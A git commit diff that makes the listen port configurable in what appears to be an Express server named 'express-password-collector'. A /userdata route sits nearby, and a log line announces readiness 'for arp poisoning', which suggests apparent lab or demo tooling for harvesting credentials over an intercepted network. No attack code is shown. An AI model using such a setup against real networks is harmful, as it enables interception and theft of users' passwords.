5ec66399c0643e89775b431942f387b2918d95f9
Jakob Fender <jakob.fender@hslu.ch>
2024-11-11 21:09:27 +0100

    add req by hosting

--- express-password-collector/src/server.ts
+++ express-password-collector/src/server.ts
@@ -39,4 +39,5 @@ app.post("/userdata", (req, res, next) => {
     }
 });
 
-app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));
+const port = process.env.PORT || 5000;
+app.listen(port, () => console.log("Server running on port 5000, ready for arp poisoning"));
